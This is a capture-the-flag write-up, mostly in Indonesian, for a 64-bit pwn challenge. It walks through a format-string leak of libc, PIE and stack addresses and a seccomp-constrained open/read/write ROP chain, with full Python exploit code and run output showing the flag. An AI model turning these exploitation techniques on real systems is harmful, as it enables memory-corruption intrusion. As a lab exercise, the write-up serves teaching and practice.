# babypwn

## Binary Specifications

```
2:55:12 › file chall; checksec chall
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d441550632209e2b7eb624470e8892ae13d8c4af, for GNU/Linux 3.2.0, not stripped
[*] '/home/chao/Documents/FastTekno/pwn/warmup/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Binary memiliki arsitektur 64 bit dengan full proteksi

```
2:55:20 › seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0011
 0009: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0011
 0010: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

Binary juga dilengkapi dengan filter seccomp dimana hanya memperbolehkan syscall **openat, open, read, write, exit**, dan **exit group**

## Bug

Binary menerima input sebanyak 4 kali, namun bug hanya terdapat pada input dan output pertama, yaitu bug format string

## Exploitation

1 kali format string tersebut dapat kita gunakan untuk melakukan leak libc dan PIE. Hasil dari leaked address tersebut dapat kita gunakan untuk:

1. Leak stack via environ(libc)
2. Mendapatkan base pie

Pada inputan kedua, binary meminta input berupa address yang nantinya value dari address tersebut akan di print oleh binary. <br>
Pada inputan ketiga, binary meminta input yang nantinya akan menjadi address yang akan kita isi pada inputan ke empat.<br>
Pada inputan ke empat, input kita akan diisi pada address yang kita inputkan pada inputan ketiga.<br><br>
Intended solution disini adalah dengan mendapatkan return address stack dan melakukan ROP dari return address.<br>
Ide-nya cukup simple. Setelah mendapatkan address environ, kita cukup meng-inputkan address **environ** tersebut pada inputan kedua agar value dari address tersebut diprint oleh binary sehingga kita mendapatkan address stack. Selanjutnya tinggal melakukan sedikit kalkulasi dari address stack tersebut untuk mendapatkan return address sehingga pada inputan ketiga, kita tinggal meng-inputkan address return dari stack.<br>
Dapat kita lihat pada kode berikut, kode ini melakukan leak libc yang nantinya akan kita gunakan lagi untuk leak stack dan mendapatkan return address.

```Python
  p.sendline("%47$p-%34$p")

  shit = p.recv().split("-")
  print shit

  libc_leak = int(shit[0], 16) - 243
  log.info("Libc leak: {}".format(hex(libc_leak)))
  libc_base = libc_leak - 0x026fc0
  log.info("Libc base: {}".format(hex(libc_base)))
  libc_environ = libc_base + 0x1ef2e0
  log.info("Libc environ: {}".format(hex(libc_environ)))
  libc_open = libc_base + 0x110e50
  log.info("Libc open: {}".format(hex(libc_open)))
  libc_puts = libc_base + 0x875a0
  log.info("Libc puts: {}".format(hex(libc_puts)))
  libc_pop_rdx_rbx = libc_base + 0x0000000000162866
  log.info("Libc pop rdx rbx: {}".format(hex(libc_pop_rdx_rbx)))
  libc_pop_rdi = libc_base + 0x0000000000026b72
  log.info("Libc pop rdi: {}".format(hex(libc_pop_rdi)))
  libc_pop_rsi_r15 = libc_base + 0x0000000000026b70
  log.info("Libc pop rsi: {}".format(hex(libc_pop_rsi_r15)))

  p.sendline(str(hex(libc_environ)))
  stack_leak = int(p.recvline()[:-1])
  log.info("Stack leak: {}".format(hex(stack_leak)))
  ret_stack = stack_leak - 0x100
  log.info("Return stack: {}".format(hex(ret_stack)))
  pie_leak = int(shit[1], 16)
  log.info("Pie leak: {}".format(hex(pie_leak)))
  base_pie = pie_leak - 0x40
  log.info("Base pie: {}".format(hex(base_pie)))

  p.sendline(hex(ret_stack))
```

Pada inputan keempat, tinggal ROP **open read write** abis tu dapet flag deh wkwk.<br>
Sesuai deskripsi soal, flag ada di **/home/babypwn/flag.txt**.<br>
Nah, ROP disini akan sedikit panjang karena filter seccomp(**cuma bisa open read write ajg**). ROPnya kayak gini nih

```Python
  payload = ''
  payload += p64(libc_pop_rdi)
  payload += p64(0)
  payload += p64(libc_pop_rsi_r15)
  payload += p64(base_pie + bss) * 2
  payload += p64(base_pie + read_plt)
  payload += p64(libc_pop_rdi)
  payload += p64(base_pie + bss)
  payload += p64(libc_pop_rsi_r15)
  payload += p64(0) * 2
  payload += p64(libc_pop_rdx_rbx)
  payload += p64(0) * 2
  payload += p64(libc_open)
  payload += p64(libc_pop_rdi)
  payload += p64(3)
  payload += p64(libc_pop_rsi_r15)
  payload += p64(base_pie + bss + 0x100) * 2
  payload += p64(libc_pop_rdx_rbx)
  payload += p64(0x100) * 2
  payload += p64(base_pie + read_plt)
  payload += p64(libc_pop_rdi)
  payload += p64(base_pie + bss + 0x100)
  payload += p64(libc_puts)
```

Untuk membuat custom ROP, tentunya diperlukan pengetahuan yang luas terhadap stack frame dan juga register pada 64 bit. Intinya, rop ini memanggil fungsi read agar kita bisa menginputkan lokasi flag yang nantinya akan di open, di read ke bss + 0x100, dan akhirnya di outputkan.<br>
ROPnya cukup panjang, sekitar 216 bytes wkwkwk, mungkin bisa lebih pendek cuma aku males buat ropchain lagi.

Output:

```
2:56:35 › python exploit.py local
[+] Starting local process './chall': pid 57335
[*] '/home/chao/Documents/FastTekno/pwn/babypwn/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
['0x7fcbc3aa80b3', '0x55d523e07040']
[*] Libc leak: 0x7fcbc3aa7fc0
[*] Libc base: 0x7fcbc3a81000
[*] Libc environ: 0x7fcbc3c702e0
[*] Libc open: 0x7fcbc3b91e50
[*] Libc puts: 0x7fcbc3b085a0
[*] Libc pop rdx rbx: 0x7fcbc3be3866
[*] Libc pop rdi: 0x7fcbc3aa7b72
[*] Libc pop rsi: 0x7fcbc3aa7b70
[*] Stack leak: 0x7fff46d0d4a8
[*] Return stack: 0x7fff46d0d3a8
[*] Pie leak: 0x55d523e07040
[*] Base pie: 0x55d523e07000
0xd8
[*] Switching to interactive mode
FastTekno{L3ak_st4CK_4nD_RO000OOppPPP_tO_tH3_w1n}
```
